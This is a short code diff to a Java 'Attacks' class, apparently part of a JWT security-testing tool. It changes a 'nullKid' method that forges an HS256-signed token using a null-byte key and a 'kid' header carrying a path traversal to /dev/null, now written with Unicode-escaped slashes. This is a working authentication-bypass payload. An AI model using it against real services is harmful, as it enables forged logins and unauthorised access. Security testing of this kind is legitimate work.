@@ -91,12 +91,14 @@ public class Attacks {
      */
     public static JWS nullKid(JWS jws) throws PEMUtils.PemException, Key.UnsupportedKeyException, CryptoUtils.SigningException {
         // Construct a NULL signing key
-        JWKKey nullSigningKey = new JWKKey(new OctetSequenceKey.Builder(new byte[0]).build());
+        //JWKKey nullSigningKey = new JWKKey(new OctetSequenceKey.Builder(new byte[0]).build());
+        JWKKey nullSigningKey = new JWKKey(new OctetSequenceKey.Builder(new Base64URL("AA==")).build());
 
         
         // Build a new header for the null kid and HMAC algorithm
         com.nimbusds.jose.JWSAlgorithm alg = new com.nimbusds.jose.JWSAlgorithm("HS256");
-        JWSHeader nullSigningInfo = new JWSHeader.Builder(alg).type(JOSEObjectType.JWT).keyID("../../../../../dev/null").build();
+        JWSHeader nullSigningInfo = new JWSHeader.Builder(alg).type(JOSEObjectType.JWT).keyID("..\u002f..\u002f..\u002f..\u002f..\u002fdev\u002fnull").build();
+ 
         return CryptoUtils.sign(nullSigningInfo.toBase64URL(), jws.getEncodedPayload(), nullSigningKey, nullSigningInfo);
     }
 
